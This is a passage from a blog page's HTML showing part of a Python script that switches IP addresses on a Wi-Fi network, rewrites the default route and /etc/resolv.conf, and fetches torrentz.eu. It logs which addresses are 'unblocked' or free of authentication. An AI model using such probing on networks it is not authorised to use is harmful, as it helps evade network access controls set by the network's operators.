    <span class="n">out</span> <span class="o">=</span> <span class="n">execute</span><span class="p">(</span><span class="s">'ping '</span> <span class="o">+</span> <span class="n">gateway</span>  <span class="o">+</span><span class="s">' -c 1 -W 1 | grep ttl '</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"can't ping gateway with "</span> <span class="o">+</span> <span class="n">ipaddress</span><span class="p">)</span>
        <span class="n">execute</span><span class="p">(</span><span class="s">'iwconfig '</span> <span class="o">+</span> <span class="n">interface</span> <span class="o">+</span> <span class="s">' ESSID '</span> <span class="o">+</span> <span class="n">ESSID</span><span class="p">)</span>
        <span class="n">out</span> <span class="o">=</span> <span class="n">execute</span><span class="p">(</span><span class="s">'ping '</span> <span class="o">+</span> <span class="n">gateway</span>  <span class="o">+</span><span class="s">' -c 1 -W 1 | grep ttl '</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">out</span><span class="p">:</span>
        <span class="n">execute</span><span class="p">(</span><span class="s">'route add default gw '</span> <span class="o">+</span> <span class="n">gateway</span><span class="p">)</span>
        <span class="n">execute</span><span class="p">(</span><span class="s">"echo -e 'nameserver 8.8.8.8'&gt;&gt; /etc/resolv.conf"</span><span class="p">)</span>
        <span class="n">out</span> <span class="o">=</span> <span class="n">execute</span><span class="p">(</span><span class="s">"ping 8.8.8.8 -c 1 -W 1 | grep ttl "</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">out</span><span class="p">:</span>
            <span class="n">out</span> <span class="o">=</span> <span class="n">execute</span><span class="p">(</span><span class="s">'curl --silent http://www.torrentz.eu/ | grep -e User -e Group'</span><span class="p">)</span>
            <span class="nb">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'open_ips'</span><span class="p">,</span><span class="s">'a'</span><span class="p">)</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">'  '</span> <span class="o">+</span> <span class="n">out</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">'  '</span> <span class="o">+</span> <span class="n">ipaddress</span><span class="p">)</span>
                <span class="nb">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">'  '</span> <span class="o">+</span> <span class="n">out</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">'  '</span> <span class="o">+</span> <span class="n">ipaddress</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">'unblocked ip '</span> <span class="o">+</span> <span class="n">ipaddress</span> <span class="p">)</span>
                <span class="nb">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'unblocked ip '</span> <span class="o">+</span> <span class="n">ipaddress</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="nb">file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">ipaddress</span> <span class="o">+</span> <span class="s">' is free but not with authenication'</span><span class="p">)</span>



</code></pre>
</div>


</article>

<div class="page-navigation">
	
		<a class="home" href="/" title="Back to Homepage">Home</a>
  
</div>

		</main>

		<div class="footer">
  <span class="block">Made with &hearts; using <a href="http://jekyllrb.com/">Jekyll</a> &amp; <a href="https://github.com/heiswayi/the-plain" title="The Plain theme by Heiswayi Nrird">The Plain</a> </span>
</div>


	</body>

</html>
